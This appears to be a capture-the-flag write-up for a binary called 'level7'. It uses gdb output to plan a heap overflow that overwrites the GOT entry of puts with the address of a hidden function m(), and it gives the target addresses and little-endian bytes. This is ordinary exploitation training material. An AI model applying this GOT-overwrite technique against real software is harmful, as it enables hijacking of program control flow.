# level7

Nothing of note with `ll` and `checksec`.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|printf|main|
|fgets|frame_dummy|
|time|m|
|strcpy||
|malloc||
|puts||
|fopen||

`frame_dummy()` does nothing (color me surprised).

we need to overwrite the address of puts with m
```sh
(gdb) x m
0x080484f4 <m>:	0x083e58955

(gdb) disass puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x08049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x080483a0
End of assembler dump.
(gdb) x 0x08049928
0x08049928 <puts@got.plt>:	0x08048406
``` 

So we need to write `m()`'s address at `puts()`' location on the **GOT**.
We will write`0x080484f4` at `0x08049928`.

The program allocates the first two arguments of `main()` at `0x0804a028` and `0x0804a038`.

The address of `m()` in writable little endian is `\xf4\x84\x04\x08`.

```sh
(gdb) x/30x 0x0804a018
0x804a018:	0x61616161	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x62626262	0x00000000	0x00000000	0x00020fc1
0x804a048:	0xfbad240c	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0xb7fd1980	0xffffffff	0x00000000
0x804a088:	0x00000000	0x00000000
```
